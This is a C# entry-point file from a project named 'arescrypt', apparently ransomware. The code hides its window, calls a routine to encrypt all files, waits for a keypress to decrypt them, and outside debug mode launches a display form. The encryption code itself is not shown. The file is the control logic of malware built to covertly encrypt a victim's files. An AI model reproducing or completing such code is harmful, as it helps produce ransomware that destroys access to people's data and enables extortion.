using System;
using System.Windows.Forms;

namespace arescrypt
{
    class Program
    {
        // Predefinitions
        static Configuration config = new Configuration(); // New instance of Configuration class
        static Queue que = new Queue();

        [STAThread]
        static void Main(string[] args)
        {
            // Hide window upon launch
            if (!config.debugMode)
                Miscellaneous.HideWindow();

            que.EncryptAllFiles();
            Console.WriteLine("All files encrypted. Press any key to launch decryption.");
            Console.ReadKey();
            que.DecryptAllFiles();
            
            // Giving "Debug Mode" switch in Configuration it's usability
            if (config.debugMode) // == true
            {
                // Exiting message
                Console.Write("\nPress any key to continue . . . ");

                try { Console.ReadKey(); } // Hang the console
                catch (Exception) { } // Because Mintty doesn't like to "ReadKeys"
            }
            else if (!config.debugMode) // == false
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Display());
            }
        }
    }
}
